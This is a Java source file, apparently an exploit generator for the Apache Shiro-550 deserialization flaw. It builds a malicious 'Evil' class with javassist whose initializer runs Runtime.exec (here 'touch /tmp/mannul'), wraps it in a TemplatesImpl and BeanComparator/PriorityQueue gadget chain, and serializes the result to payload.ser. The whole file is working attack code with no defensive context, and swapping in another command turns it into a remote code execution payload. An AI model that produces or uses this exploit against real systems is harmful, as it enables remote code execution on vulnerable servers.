package com.example;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.PriorityQueue;
import java.util.Queue;

import org.apache.commons.beanutils.BeanComparator;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;

import javassist.*;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;


public class Shiro550 {
    public static void main(String[] args) throws Exception{
        ClassPool pool =ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc=pool.makeClass("Evil");
        String cmd="java.lang.Runtime.getRuntime().exec(\"touch /tmp/mannul\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String rename="Evil"+System.nanoTime();
        cc.setName((rename));  
        byte[] bytes=cc.toBytecode();
        byte[][] target=new byte[][]{bytes};

        TemplatesImpl templates=new TemplatesImpl();
        Field name=templates.getClass().getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "test");

        Field byteCodes=templates.getClass().getDeclaredField("_bytecodes");
        byteCodes.setAccessible(true);
        byteCodes.set(templates, target);

        Field classField=templates.getClass().getDeclaredField("_class");
        classField.setAccessible(true);
        classField.set(templates, null);

        Field tfactory=templates.getClass().getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates, new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());

        BeanComparator comparator=new BeanComparator(null);

        PriorityQueue pq=new PriorityQueue<>(2,comparator);
        pq.add(1);
        pq.add(1);

        Field qField=pq.getClass().getDeclaredField("queue");
        qField.setAccessible(true);
        Object[] q=(Object[])qField.get(pq);
        q[0]=templates;
        q[1]=templates;

        Field proField=comparator.getClass().getDeclaredField("property");
        proField.setAccessible(true);
        proField.set(comparator, "outputProperties");   

        FileOutputStream fos=new FileOutputStream("payload.ser");
        ObjectOutputStream oos=new ObjectOutputStream(fos);
        oos.writeObject(pq);
        oos.close();




    }

    
}

